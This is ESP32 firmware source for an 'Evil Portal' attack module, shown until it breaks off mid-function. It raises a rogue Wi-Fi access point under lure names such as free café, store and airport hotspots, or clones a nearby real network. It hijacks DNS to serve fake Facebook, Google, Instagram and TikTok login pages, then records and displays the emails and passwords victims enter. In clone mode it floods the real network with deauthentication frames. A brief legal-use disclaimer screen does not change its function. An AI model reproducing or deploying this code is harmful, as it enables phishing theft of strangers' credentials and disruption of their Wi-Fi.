#include "EvilPortal.h"
#include "EvilPortalHTML.h"
#include "EvilPortalLogs.h"
#include "DisplayTFT.h"
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include "esp_wifi.h"
#include "PepeDraw.h"
#include "Pins.h"
#include "PeripheralTools.h"
#include "SoundUtils.h"
#include "WifiUi.h"

extern DisplayTFT tft;

// ═══════════════════════════════════════════════════════════════════════════
//  CONFIGURACIÓN
// ═══════════════════════════════════════════════════════════════════════════
#define MAX_APS_SCAN    30
#define VISIBLE_ROWS    4
#define DNS_PORT        53
#define HTTP_PORT       80

// ═══════════════════════════════════════════════════════════════════════════
//  SSIDs PREDEFINIDOS
// ═══════════════════════════════════════════════════════════════════════════
static const char* PRESET_SSIDS[] = {
    "INFINITUM_5G_LIBRE",
    "TOTALPLAY_INVITADOS",
    "MEGACABLE_FREE_WIFI",
    "IZZI_HOTSPOT",
    "Starbucks_Clientes",
    "OXXO_WiFi_Gratis",
    "Walmart_Free",
    "MCDONALDS_FREE",
    "Aeropuerto_WiFi",
    "Plaza_WiFi_Gratis"
};
static const int PRESET_COUNT = sizeof(PRESET_SSIDS) / sizeof(char*);

// ═══════════════════════════════════════════════════════════════════════════
//  ESTADO GLOBAL
// ═══════════════════════════════════════════════════════════════════════════
static DNSServer dnsServer;
static WebServer httpServer(HTTP_PORT);

static String       g_currentSSID = "";
static uint8_t      g_cloneBSSID[6] = {0};
static int          g_cloneChannel = 1;
static bool         g_cloneMode = false;
static bool         g_doDeauth = false;

static volatile int g_clientsConnected = 0;
static volatile int g_capturesSession = 0;
static String       g_lastCapturePlatform = "";
static String       g_lastCaptureEmail = "";
static String       g_lastCapturePassword = "";
static unsigned long g_lastCaptureTime = 0;

// Deauth frame (igual al del Deauther)
static uint8_t deauthFrame[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x07, 0x00
};

// ═══════════════════════════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════════════════════════

static void drawCenteredTitle(const String& s, int y, uint16_t col, int size) {
    int w = getTextWidth(s, size, FONT_BIG);
    drawStringBig((320 - w) / 2, y, s, col, size);
}

static int rssiBars(int rssi) {
    if (rssi >= -55) return 4;
    if (rssi >= -70) return 3;
    if (rssi >= -85) return 2;
    if (rssi >= -95) return 1;
    return 0;
}

static String macToStr(const uint8_t mac[6]) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}

static String replaceAll(const String& haystack,
                         const String& needle,
                         const String& replacement) {
    String out = haystack;
    int idx;
    while ((idx = out.indexOf(needle)) >= 0) {
        out = out.substring(0, idx) + replacement +
              out.substring(idx + needle.length());
    }
    return out;
}

// ═══════════════════════════════════════════════════════════════════════════
//  HANDLERS HTTP
// ═══════════════════════════════════════════════════════════════════════════

static void handleRoot() {
    g_clientsConnected++;
    String page = FPSTR(html_selector);
    page = replaceAll(page, "__SSID__", g_currentSSID);
    httpServer.send(200, "text/html", page);
}

static void handleFB() {
    httpServer.send_P(200, "text/html", html_facebook);
}

static void handleGG() {
    httpServer.send_P(200, "text/html", html_google);
}

static void handleIG() {
    httpServer.send_P(200, "text/html", html_instagram);
}

static void handleTT() {
    httpServer.send_P(200, "text/html", html_tiktok);
}

static void handleLogin() {
    String platform = httpServer.arg("platform");
    String email    = httpServer.arg("email");
    String password = httpServer.arg("password");

    if (platform.length() == 0) platform = "Unknown";

    portalLogAdd(platform, email, password, g_currentSSID);
    g_capturesSession++;
    g_lastCapturePlatform = platform;
    g_lastCaptureEmail = email;
    g_lastCapturePassword = password;
    g_lastCaptureTime = millis();

    beep(3200, 50);

    httpServer.send_P(200, "text/html", html_success);
}

static void handleCaptive() {
    String page = FPSTR(html_selector);
    page = replaceAll(page, "__SSID__", g_currentSSID);
    httpServer.send(200, "text/html", page);
}

static void handleNotFound() {
    httpServer.sendHeader("Location", "/", true);
    httpServer.send(302, "text/plain", "");
}

// ═══════════════════════════════════════════════════════════════════════════
//  INICIAR AP + DNS + HTTP
// ═══════════════════════════════════════════════════════════════════════════

static bool startPortal(const String& ssid, int channel = 6) {
    g_currentSSID = ssid;
    g_clientsConnected = 0;
    g_capturesSession = 0;
    g_lastCapturePlatform = "";
    g_lastCaptureEmail = "";
    g_lastCapturePassword = "";

    WiFi.mode(WIFI_AP);
    delay(100);

    IPAddress apIP(192, 168, 4, 1);
    IPAddress apNet(255, 255, 255, 0);
    WiFi.softAPConfig(apIP, apIP, apNet);

    bool apOk = WiFi.softAP(ssid.c_str(), nullptr, channel, 0, 8);
    if (!apOk) return false;

    delay(200);

    if (g_cloneMode && g_doDeauth) {
        esp_wifi_set_promiscuous(true);
    }

    dnsServer.start(DNS_PORT, "*", apIP);

    httpServer.on("/",  handleRoot);
    httpServer.on("/fb", handleFB);
    httpServer.on("/gg", handleGG);
    httpServer.on("/ig", handleIG);
    httpServer.on("/tt", handleTT);
    httpServer.on("/login", HTTP_POST, handleLogin);

    httpServer.on("/generate_204",       handleCaptive);
    httpServer.on("/gen_204",            handleCaptive);
    httpServer.on("/hotspot-detect.html", handleCaptive);
    httpServer.on("/library/test/success.html", handleCaptive);
    httpServer.on("/success.txt",        handleCaptive);
    httpServer.on("/ncsi.txt",           handleCaptive);
    httpServer.on("/connecttest.txt",    handleCaptive);
    httpServer.onNotFound(handleNotFound);

    httpServer.begin();
    return true;
}

static void stopPortal() {
    httpServer.stop();
    dnsServer.stop();
    if (g_cloneMode && g_doDeauth) {
        esp_wifi_set_promiscuous(false);
    }
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(100);
}

// ═══════════════════════════════════════════════════════════════════════════
//  DEAUTH EN PARALELO (solo en clone mode)
// ═══════════════════════════════════════════════════════════════════════════

static void sendDeauthToVictimNetwork() {
    const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    memcpy(&deauthFrame[4],  broadcast,    6);
    memcpy(&deauthFrame[10], g_cloneBSSID, 6);
    memcpy(&deauthFrame[16], g_cloneBSSID, 6);
    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
}

// ═══════════════════════════════════════════════════════════════════════════
//  DISCLAIMER
// ═══════════════════════════════════════════════════════════════════════════

static bool showDisclaimer() {
    wifiUiFrame("EVIL PORTAL", "NOTICE", WIFI_UI_DANGER);
    wifiUiCard(10, 49, 300, 151, false, WIFI_UI_DANGER);

    int y = 57;
    drawStringCustom(10, y, "Crea un AP falso para capturar",     UI_MAIN, 1); y += 12;
    drawStringCustom(10, y, "credenciales via portal cautivo.",   UI_MAIN, 1); y += 20;

    drawStringCustom(10, y, "Uso LEGAL:",                          TFT_GREEN, 1); y += 12;
    drawStringCustom(20, y, "- Tu red / tus dispositivos",         UI_ACCENT, 1); y += 12;
    drawStringCustom(20, y, "- Red con permiso del dueno",         UI_ACCENT, 1); y += 18;

    drawStringCustom(10, y, "Uso ILEGAL:",                         TFT_RED, 1); y += 12;
    drawStringCustom(20, y, "- Enganar a terceros",                UI_ACCENT, 1); y += 12;
    drawStringCustom(20, y, "- Capturar info sin consentim.",      UI_ACCENT, 1); y += 18;

    drawStringCustom(10, y, "Phishing es delito grave.",           TFT_RED, 1); y += 12;
    drawStringCustom(10, y, "100% responsabilidad tuya.",          UI_MAIN, 1);

    wifiUiFooter("AUTHORIZED DEVICES", "OK: ACCEPT", WIFI_UI_DANGER);

    while (true) {
        if (navEnterPressed()) {
            beep(2200, 60);
            while (navEnterPressed() || navBackPressed()) delay(5);
            delay(100);
            return true;
        }
        if (navBackPressed() || navUpPressed() || navDownPressed()) {
            beep(1000, 80);
            while (navBackPressed() || navUpPressed() || navDownPressed()) delay(5);
            delay(100);
            return false;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  MENÚ PRINCIPAL
// ═══════════════════════════════════════════════════════════════════════════

static void drawMainMenu(int cursor) {
    wifiUiFrame("EVIL PORTAL", "CONTROL");

    const char* items[] = {
        "Iniciar Ataque",
        "Ver Logs Capturados",
        "Borrar Todos los Logs"
    };

    for (int i = 0; i < 3; i++) {
        int y = 53 + i * 48;
        bool sel = (i == cursor);
        wifiUiCard(10, y - 4, 300, 40, sel,
                   i == 2 ? WIFI_UI_DANGER : WIFI_UI_ACCENT);
        uint16_t col = sel ? UI_BG : UI_MAIN;
        drawStringCustom(20, y + 7, items[i], col, 2);
    }

    int logCount = portalLogCount();
    wifiUiFooter("LOGS " + String(logCount) + "/" + String(MAX_LOGS),
                 "OK: SELECT");
}

static int selectMainMenu() {
    int cursor = 0;
    drawMainMenu(cursor);
    while (true) {
        if (navBackPressed()) {
            beep(1000, 40);
            while (navBackPressed()) delay(5);
            return -1;
        }
        if (navUpPressed()) {
            cursor = (cursor + 2) % 3;
            beep(2100, 20);
            drawMainMenu(cursor);
            delay(70);
        }
        if (navDownPressed()) {
            cursor = (cursor + 1) % 3;
            beep(2100, 20);
            drawMainMenu(cursor);
            delay(70);
        }
        if (navEnterPressed()) {
            bool held = waitOkReleaseWasLong();
            beep(held ? 1000 : 1800, 40);
            delay(100);
            if (held) return -1;
            return cursor;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  MODO: SIMPLE vs CLONE
// ═══════════════════════════════════════════════════════════════════════════

static int selectMode() {
    const char* items[] = {
        "Modo SIMPLE",
        "Modo CLONE + Deauth"
    };
    const char* descs[] = {
        "SSID predefinido",
        "Clona red real + ataque",
        ""
    };

    int cursor = 0;
    auto draw = [&]() {
        wifiUiFrame("SELECT MODE", "PORTAL");

    for (int i = 0; i < 2; i++) {
            int y = 58 + i * 66;
            bool sel = (i == cursor);
            wifiUiCard(10, y - 4, 300, 54, sel,
                       i == 1 ? WIFI_UI_DANGER : WIFI_UI_ACCENT);
            uint16_t colMain = sel ? UI_BG : UI_MAIN;
            uint16_t colSub  = sel ? WIFI_UI_PANEL : WIFI_UI_MUTED;
            drawStringCustom(20, y + 4, items[i], colMain, 2);
            if (strlen(descs[i]) > 0) {
                drawStringCustom(20, y + 27, descs[i], colSub, 1);
            }
        }

        wifiUiFooter("UP/DN: MODE", "OK: SELECT");
    };
    draw();

    while (true) {
        if (navBackPressed()) {
            beep(1000, 40);
            while (navBackPressed()) delay(5);
            return -1;
        }
        if (navUpPressed()) {
            cursor = (cursor + 1) % 2;
            beep(2100, 20); draw(); delay(70);
        }
        if (navDownPressed()) {
            cursor = (cursor + 1) % 2;
            beep(2100, 20); draw(); delay(70);
        }
        if (navEnterPressed()) {
            bool held = waitOkReleaseWasLong();
            beep(held ? 1000 : 1800, 40);
            delay(100);
            return held ? -1 : cursor;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  SELECTOR DE SSID PREDEFINIDO
// ═══════════════════════════════════════════════════════════════════════════

static int selectPresetSSID() {
    int cursor = 0;
    int scrollOffset = 0;
    int total = PRESET_COUNT;

    auto draw = [&]() {
        wifiUiFrame("SELECT SSID", String(PRESET_COUNT) + " PRESETS");

        const int rowH = 39;
        const int listY = 47;
        for (int i = 0; i < VISIBLE_ROWS; i++) {
            int idx = i + scrollOffset;
            if (idx >= total) break;
            int y = listY + i * rowH;
            bool sel = (idx == cursor);
            wifiUiCard(10, y + 1, 298, 35, sel);
            uint16_t col = sel ? UI_BG : UI_MAIN;
            String ssid = String(PRESET_SSIDS[idx]);
            if (getTextWidth(ssid, 2) <= 290) {
                drawStringCustom(18, y + 11, ssid, col, 2);
            } else {
                drawStringFit(18, y + 14, ssid, col, 280, 1);
            }
        }

        if (total > VISIBLE_ROWS) {
            int barH = max(16, (VISIBLE_ROWS * 148) / total);
            int barY = 49 + (scrollOffset * (148 - barH)) / (total - VISIBLE_ROWS);
            tft.fillRect(312, 49, 3, 148, WIFI_UI_BG);
            tft.fillRect(312, barY, 3, barH, WIFI_UI_ACCENT);
        }

        wifiUiFooter("UP/DN: SSID", "OK: START");
    };
    draw();

    while (true) {
        if (navBackPressed()) {
            beep(1000, 40);
            while (navBackPressed()) delay(5);
            return -1;
        }
        if (navUpPressed()) {
            cursor = (cursor + total - 1) % total;
            if (cursor < scrollOffset) scrollOffset = cursor;
            if (cursor >= scrollOffset + VISIBLE_ROWS)
                scrollOffset = cursor - VISIBLE_ROWS + 1;
            beep(2100, 20); draw(); delay(70);
        }
        if (navDownPressed()) {
            cursor = (cursor + 1) % total;
            if (cursor < scrollOffset) scrollOffset = cursor;
            if (cursor >= scrollOffset + VISIBLE_ROWS)
                scrollOffset = cursor - VISIBLE_ROWS + 1;
            beep(2100, 20); draw(); delay(70);
        }
        if (navEnterPressed()) {
            bool held = waitOkReleaseWasLong();
            beep(held ? 1000 : 1800, 40);
            delay(100);
            if (held) return -1;
            return cursor;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  CLONE MODE: SCAN + SELECT
// ═══════════════════════════════════════════════════════════════════════════

struct ScanAP {
    String  ssid;
    uint8_t bssid[6];
    int     rssi;
    int     channel;
};

static ScanAP scanAPs[MAX_APS_SCAN];
static int    scanAPCount = 0;

static void scanForClone() {
    scanAPCount = 0;

    wifiUiScanning("CLONE MODE", "SEARCHING NETWORKS", 0, 0, 0);

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    WiFi.scanNetworks(true, true);

    unsigned long start = millis();
    int tick = 0;
    while (millis() - start < 8000) {
        float p = (float)(millis() - start) / 8000.0f;
        int status = WiFi.scanComplete();
        if (status >= 0) break;
        wifiUiScanning("CLONE MODE", "SEARCHING NETWORKS", tick++,
                       (int)(p * 100.0f), 0);
        delay(110);
    }

    int n = WiFi.scanComplete();
    while (n == WIFI_SCAN_RUNNING) { delay(100); n = WiFi.scanComplete(); }
    if (n < 0) n = 0;
    if (n > MAX_APS_SCAN) n = MAX_APS_SCAN;

    for (int i = 0; i < n; i++) {
        scanAPs[i].ssid = WiFi.SSID(i);
        if (scanAPs[i].ssid.length() == 0) scanAPs[i].ssid = "<hidden>";
        scanAPs[i].rssi = WiFi.RSSI(i);
        scanAPs[i].channel = WiFi.channel(i);
        uint8_t* b = WiFi.BSSID(i);
        if (b) memcpy(scanAPs[i].bssid, b, 6);
    }
    scanAPCount = n;
    WiFi.scanDelete();

    for (int i = 0; i < scanAPCount - 1; i++) {
        for (int j = 0; j < scanAPCount - 1 - i; j++) {
            if (scanAPs[j].rssi < scanAPs[j + 1].rssi) {
                ScanAP t = scanAPs[j];
                scanAPs[j] = scanAPs[j + 1];
                scanAPs[j + 1] = t;
            }
        }
    }

    beep(2400, 50);
}

static int selectCloneTarget() {
    if (scanAPCount == 0) return -1;

    int cursor = 0;
    int scrollOffset = 0;
    int total = scanAPCount;

    auto draw = [&]() {
        wifiUiFrame("CLONE TARGET", String(scanAPCount) + " AP");

        const int rowH = 39;
        const int listY = 47;
        for (int i = 0; i < VISIBLE_ROWS; i++) {
            int idx = i + scrollOffset;
            if (idx >= total) break;
            int y = listY + i * rowH;
            bool sel = (idx == cursor);
            wifiUiCard(10, y + 1, 298, 35, sel);
            uint16_t col1 = sel ? UI_BG : UI_MAIN;
            uint16_t col2 = sel ? UI_BG : UI_ACCENT;

            String s = scanAPs[idx].ssid;
            drawStringFit(18, y + 5, s, col1, 245, 1);
            String meta = "CH" + String(scanAPs[idx].channel) + " " +
                          String(scanAPs[idx].rssi) + "dBm";
            drawStringCustom(18, y + 21, meta, col2, 1);
            int bars = rssiBars(scanAPs[idx].rssi);
            int bx = 280, by = y + 27;
            for (int b = 0; b < 4; b++) {
                int bh = 3 + b * 2;
                uint16_t c = (b < bars)
                    ? (sel ? UI_BG : (bars >= 3 ? TFT_GREEN :
                                      bars >= 2 ? TFT_YELLOW : TFT_ORANGE))
                    : (sel ? UI_BG : UI_ACCENT);
                if (b < bars) tft.fillRect(bx + b*5, by - bh, 3, bh, c);
                else          tft.drawRect(bx + b*5, by - bh, 3, bh, c);
            }
        }

        if (total > VISIBLE_ROWS) {
            int barH = max(16, (VISIBLE_ROWS * 148) / total);
            int barY = 49 + (scrollOffset * (148 - barH)) / (total - VISIBLE_ROWS);
            tft.fillRect(312, 49, 3, 148, WIFI_UI_BG);
            tft.fillRect(312, barY, 3, barH, WIFI_UI_ACCENT);
        }

        wifiUiFooter("UP/DN: TARGET", "OK: CLONE");
    };
    draw();

    while (true) {
        if (navBackPressed()) {
            beep(1000, 40);
            while (navBackPressed()) delay(5);
            return -1;
        }
        if (navUpPressed()) {
            cursor = (cursor + total - 1) % total;
            if (cursor < scrollOffset) scrollOffset = cursor;
            if (cursor >= scrollOffset + VISIBLE_ROWS)
                scrollOffset = cursor - VISIBLE_ROWS + 1;
            beep(2100, 20); draw(); delay(70);
        }
        if (navDownPressed()) {
            cursor = (cursor + 1) % total;
            if (cursor < scrollOffset) scrollOffset = cursor;
            if (cursor >= scrollOffset + VISIBLE_ROWS)
                scrollOffset = cursor - VISIBLE_ROWS + 1;
            beep(2100, 20); draw(); delay(70);
        }
        if (navEnterPressed()) {
            bool held = waitOkReleaseWasLong();
            beep(held ? 1000 : 1800, 40);
            delay(100);
            if (held) return -1;
            return cursor;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  DASHBOARD DE ATAQUE ACTIVO
// ═══════════════════════════════════════════════════════════════════════════

static void drawDashboardFrame() {
    wifiUiFrame("PORTAL ACTIVE", g_cloneMode ? "CLONE" : "SIMPLE",
                g_cloneMode ? WIFI_UI_DANGER : WIFI_UI_OK);
    wifiUiCard(10, 48, 300, 45, false,
               g_cloneMode ? WIFI_UI_DANGER : WIFI_UI_ACCENT);
    drawStringFit(18, 57, "SSID: " + g_currentSSID, WIFI_UI_TEXT, 284, 1);
    if (g_cloneMode) {
        drawStringCustom(18, 75, "CLONE MODE", WIFI_UI_DANGER, 1);
        drawStringCustom(120, 75, "CH" + String(g_cloneChannel), WIFI_UI_ACCENT, 1);
    } else {
        drawStringCustom(18, 75, "SIMPLE MODE", WIFI_UI_OK, 1);
    }
    wifiUiMetric(10, 101, 145, "CONNECTED", "0", WIFI_UI_WARN);
    wifiUiMetric(165, 101, 145, "CAPTURES", "0", WIFI_UI_OK);
    wifiUiCard(10, 151, 300, 49, false);
    drawStringCustom(18, 158, "LAST CAPTURE", WIFI_UI_MUTED, 1);
    wifiUiFooter("DOWN: LOGS", "HOLD OK: STOP", WIFI_UI_DANGER);
}

static void drawDashboardStats() {
    tft.fillRect(18, 120, 128, 17, WIFI_UI_PANEL);
    drawStringBig(18, 120, String((int)g_clientsConnected), WIFI_UI_WARN, 1);

    tft.fillRect(173, 120, 128, 17, WIFI_UI_PANEL);
    drawStringBig(173, 120, String((int)g_capturesSession), WIFI_UI_OK, 1);

    tft.fillRect(18, 167, 284, 30, WIFI_UI_PANEL);
    if (g_lastCapturePlatform.length() > 0) {
        drawStringCustom(18, 168, "PLATFORM: " + g_lastCapturePlatform,
                         WIFI_UI_ACCENT, 1);
        String em = g_lastCaptureEmail;
        drawStringFit(18, 180, "USER: " + em, WIFI_UI_TEXT, 284, 1);
        drawStringFit(18, 192, "PASS: " + g_lastCapturePassword,
                      WIFI_UI_DANGER, 284, 1);

    } else {
        drawStringCustom(18, 177, "WAITING FOR FIRST CAPTURE...",
                         WIFI_UI_MUTED, 1);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  LOOP PRINCIPAL DEL PORTAL
// ═══════════════════════════════════════════════════════════════════════════

static void runPortalLoop() {
    drawDashboardFrame();
    drawDashboardStats();
    beep(2400, 40); delay(20);
    beep(3000, 60);

    unsigned long lastRedraw = millis();
    unsigned long lastDeauth = millis();
    int lastConn = 0;
    int lastCap = 0;

    bool stopAttack = false;
    unsigned long okPressStart = 0;
    bool okHeld = false;

    while (!stopAttack) {
        dnsServer.processNextRequest();
        httpServer.handleClient();

        if (navBackPressed()) {
            stopAttack = true;
            while (navBackPressed()) delay(5);
            continue;
        }

        if (g_cloneMode && g_doDeauth &&
            millis() - lastDeauth > 30) {
            sendDeauthToVictimNetwork();
            lastDeauth = millis();
        }

        bool needRedraw = false;
        if (g_clientsConnected != lastConn) {
            lastConn = g_clientsConnected;
            needRedraw = true;
        }
        if (g_capturesSession != lastCap) {
            lastCap = g_capturesSession;
            needRedraw = true;
            beep(3600, 60); delay(30); beep(4200, 100);
        }
        if (millis() - lastRedraw > 1000) {
            needRedraw = true;
        }
        if (needRedraw) {
            drawDashboardStats();
            lastRedraw = millis();
        }

        if (navEnterPressed()) {
            if (!okHeld) {
                okPressStart = millis();
                okHeld = true;
            } else if (millis() - okPressStart > 500) {
                stopAttack = true;
            }
        } else {
            okHeld = false;
        }

        yield();
        delay(2);
    }

    stopPortal();

    beep(1800, 40); delay(20);
    beep(1200, 60);

    while (navEnterPressed() || navBackPressed()) delay(5);
    delay(150);
}

// ═══════════════════════════════════════════════════════════════════════════
//  VISOR DE LOGS · letras grandes (size 2)
// ═══════════════════════════════════════════════════════════════════════════

static String truncateNativeToWidth(const String& txt, int maxWidth,
                                    uint8_t font, uint8_t size) {
    if (maxWidth <= 0) return "";
    if (tft.nativeTextWidth(txt, font, size) <= maxWidth) return txt;

    const String ellipsis = "..";
    if (tft.nativeTextWidth(ellipsis, font, size) >= maxWidth) return "";

    int lastGood = 0;
    for (int i = 1; i <= (int)txt.length(); i++) {
        String candidate = txt.substring(0, i) + ellipsis;
        if (tft.nativeTextWidth(candidate, font, size) > maxWidth) break;
        lastGood = i;
    }
    return (lastGood > 0) ? txt.substring(0, lastGood) + ellipsis : ellipsis;
}

static void drawNativeFit(int x, int y, const String& txt, uint16_t color,
                          int maxWidth, uint8_t font = 2, uint8_t size = 1) {
    tft.drawNativeStringTransparent(x, y,
                                    truncateNativeToWidth(txt, maxWidth, font, size),
                                    color, font, size);
}

static int drawLogDetailField(int y, const String& label, const String& value,
                              uint16_t valueColor) {
    drawStringCustom(18, y, label, WIFI_UI_MUTED, 1);
    y += 11;

    wifiUiCard(10, y - 2, 300, 25, false, valueColor);
    drawStringFit(18, y + 4, value, valueColor, 284, 1, FONT_BIG);
    return y + 31;
}

static String cleanExportField(const char* value) {
    String out = String(value);
    out.replace("\r", " ");
    out.replace("\n", " ");
    out.replace("\t", " ");
    return out;
}

static String redactedPassword(const char* value) {
    int len = strlen(value);
    if (len <= 0) return "[EMPTY]";
    return "[REDACTED len:" + String(len) + "]";
}

static bool exportLogsToSd(int& exportedCount) {
    exportedCount = 0;
    int count = portalLogCount();
    if (count <= 0) return false;

    String out;
    out.reserve(128 + count * 180);
    out += "LOGS EXPORTADOS: " + String(count) + "\r\n";
    out += "PASSWORD: REDACTADA EN SD\r\n";
    out += "\r\n";

    for (int i = 0; i < count; i++) {
        PortalLog log;
        if (!portalLogGet(i, log)) continue;

        out += "#" + String(i + 1) + "\r\n";
        out += "PLATFORM: " + cleanExportField(log.platform) + "\r\n";
        out += "USER: " + cleanExportField(log.email) + "\r\n";
        out += "PASS: " + redactedPassword(log.password) + "\r\n";
        out += "SSID: " + cleanExportField(log.ssid) + "\r\n";
        out += "BOOT: " + String(log.bootNum) + "\r\n";
        out += "UPTIME: " + String(log.timestampSec) + "s\r\n";
        out += "\r\n";
        exportedCount++;
    }

    return exportedCount > 0 && sdWriteTextFile("/CREDENCIALES.txt", out);
}

static void showLogExportResult(bool ok, int exportedCount) {
    wifiUiFrame(ok ? "EXPORT OK" : "EXPORT ERROR", "SD",
                ok ? WIFI_UI_OK : WIFI_UI_DANGER);
    wifiUiCard(18, 67, 284, 104, false,
               ok ? WIFI_UI_OK : WIFI_UI_DANGER);

    if (ok) {
        drawStringCustom(30, 81, "SAVED TO microSD", WIFI_UI_TEXT, 1);
        drawStringCustom(30, 103, "/CREDENCIALES.txt", WIFI_UI_ACCENT, 2);
        drawStringCustom(30, 137, "LOGS: " + String(exportedCount), WIFI_UI_TEXT, 1);
        drawStringCustom(30, 153, "PASSWORDS REDACTED", WIFI_UI_WARN, 1);
    } else {
        drawStringCustom(30, 92, "SD WRITE FAILED", WIFI_UI_TEXT, 1);
        drawStringCustom(30, 118, "CHECK CARD AND FREE SPACE", WIFI_UI_WARN, 1);
    }

    wifiUiFooter("LOG EXPORT", "OK/BACK: RETURN");
    while (!navEnterPressed() && !navBackPressed()) delay(20);
    while (navEnterPressed() || navBackPressed()) delay(5);
    delay(80);
}

static void showLogDetail(const PortalLog& log) {
    wifiUiFrame("LOG DETAIL", "CAPTURE", WIFI_UI_WARN);

    int y = 48;

    y = drawLogDetailField(y, "Platform", String(log.platform), UI_SELECT);
    y = drawLogDetailField(y, "Email / User", String(log.email), UI_MAIN);
    y = drawLogDetailField(y, "Password", String(log.password), TFT_RED);

    drawStringFit(12, y, "SSID: " + String(log.ssid), UI_ACCENT, 296, 1);
    y += 18;
    drawStringFit(12, y, "Boot #" + String(log.bootNum) +
                  " @ " + String(log.timestampSec) + "s",
                  UI_ACCENT, 296, 1);

    wifiUiFooter("CAPTURE DETAIL", "OK/BACK: RETURN");

    while (!navEnterPressed() && !navBackPressed()) delay(20);
    beep(1800, 40);
    while (navEnterPressed() || navBackPressed()) delay(5);
    delay(100);
}

static void viewLogs() {
    int count = portalLogCount();
    if (count == 0) {
        wifiUiEmpty("PORTAL LOGS", "NO CAPTURES SAVED",
                    "START AN AUTHORIZED TEST FIRST", WIFI_UI_WARN);
        while (!navEnterPressed() && !navBackPressed()) delay(20);
        beep(1800, 40);
        while (navEnterPressed() || navBackPressed()) delay(5);
        return;
    }

    int cursor = 0;
    int scrollOffset = 0;
    int total = count;

    auto draw = [&]() {
        wifiUiFrame("PORTAL LOGS", String(count) + " SAVED");

        const int rowH = 39;
        const int listY = 47;
        int visibleRows = 4;

        for (int i = 0; i < visibleRows; i++) {
            int idx = i + scrollOffset;
            if (idx >= total) break;
            int y = listY + i * rowH;
            bool sel = (idx == cursor);
            wifiUiCard(10, y + 1, 298, 35, sel);
            uint16_t col1 = sel ? UI_BG : UI_MAIN;
            uint16_t col2 = sel ? UI_BG : UI_ACCENT;

            PortalLog log;
            if (portalLogGet(idx, log)) {
                String line1 = "[#" + String(idx + 1) + "] " +
                               String(log.platform);
                drawStringFit(18, y + 5, line1, col1, 282, 1, FONT_BIG);
                String em = String(log.email);
                drawStringFit(18, y + 21, em, col2, 282, 1);
            }
        }

        if (total > visibleRows) {
            int barH = max(16, (visibleRows * 148) / total);
            int barY = 49 + (scrollOffset * (148 - barH)) / (total - visibleRows);
            tft.fillRect(312, 49, 3, 148, WIFI_UI_BG);
            tft.fillRect(312, barY, 3, barH, WIFI_UI_ACCENT);
        }

        wifiUiFooter("UP/DN: LOG", "OK: VIEW  HOLD: SAVE");
    };
    draw();

    while (true) {
        if (navUpPressed()) {
            cursor = (cursor + total - 1) % total;
            if (cursor < scrollOffset) scrollOffset = cursor;
            if (cursor >= scrollOffset + 4) scrollOffset = cursor - 3;
            beep(2100, 20); draw(); delay(70);
        }
        if (navDownPressed()) {
            cursor = (cursor + 1) % total;
            if (cursor < scrollOffset) scrollOffset = cursor;
            if (cursor >= scrollOffset + 4) scrollOffset = cursor - 3;
            beep(2100, 20); draw(); delay(70);
        }
        if (navBackPressed()) {
            while (navBackPressed()) delay(5);
            beep(1000, 40);
            delay(120);
            break;
        }
        if (navEnterPressed()) {
            bool held = waitOkReleaseWasLong();
            beep(held ? 1000 : 1800, 40);
            delay(100);
            if (held) {
                int exported = 0;
                bool ok = exportLogsToSd(exported);
                beep(ok ? 2400 : 900, 60);
                showLogExportResult(ok, exported);
                draw();
                delay(120);
                continue;
            }
            PortalLog log;
            if (portalLogGet(cursor, log)) {
                showLogDetail(log);
                draw();
            }
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  CONFIRMAR BORRAR LOGS
// ═══════════════════════════════════════════════════════════════════════════

static bool confirmClearLogs() {
    wifiUiFrame("CLEAR LOGS", "CONFIRM", WIFI_UI_DANGER);
    wifiUiCard(20, 73, 280, 91, false, WIFI_UI_DANGER);
    drawStringBig(44, 92, "DELETE ALL SAVED LOGS?", WIFI_UI_DANGER, 1);
    drawStringCustom(63, 126, "THIS ACTION CANNOT BE UNDONE",
                     WIFI_UI_MUTED, 1);
    wifiUiFooter("BACK: CANCEL", "OK: DELETE", WIFI_UI_DANGER);

    while (true) {
        if (navEnterPressed()) {
            beep(1200, 80);
            while (navEnterPressed() || navBackPressed()) delay(5);
            delay(100);
            return true;
        }
        if (navBackPressed() || navUpPressed() || navDownPressed()) {
            beep(2000, 40);
            while (navBackPressed() || navUpPressed() || navDownPressed()) delay(5);
            delay(100);
            return false;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  FLOW DE ATAQUE
// ═══════════════════════════════════════════════════════════════════════════

static void startAttackFlow() {
    int mode = selectMode();
    if (mode < 0) return;

    if (mode == 0) {
        int ssidIdx = selectPresetSSID();
        if (ssidIdx < 0) return;
        g_cloneMode = false;
        g_doDeauth = false;
        if (!startPortal(String(PRESET_SSIDS[ssidIdx]), 6)) {
            wifiUiEmpty("EVIL PORTAL", "FAILED TO START AP",
                        "CHECK RADIO STATE");
            delay(2000);
            return;
        }
    } else {
        scanForClone();
        if (scanAPCount == 0) {
            wifiUiEmpty("CLONE MODE", "NO NETWORKS FOUND",
                        "TRY ANOTHER LOCATION");
            delay(2000);
            return;
        }
        int cloneIdx = selectCloneTarget();
        if (cloneIdx < 0) return;

        g_cloneMode = true;
        g_doDeauth = true;
